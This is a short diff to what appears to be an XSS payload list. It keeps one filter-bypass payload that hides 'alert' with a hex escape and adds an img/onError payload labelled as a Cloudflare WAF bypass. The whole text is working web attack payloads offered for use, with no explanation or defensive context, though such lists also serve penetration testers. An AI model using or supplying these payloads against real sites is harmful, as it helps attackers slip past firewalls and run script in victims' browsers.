@@ -1,1 +1,3 @@
 "-top['al\x65rt']('sailay')-"   -----> Bypass of "-alert(0)-"
+Cloudflare WAF bypass: <img/src=x onError="`${x}`;alert(`Ex.Mi`);">
+
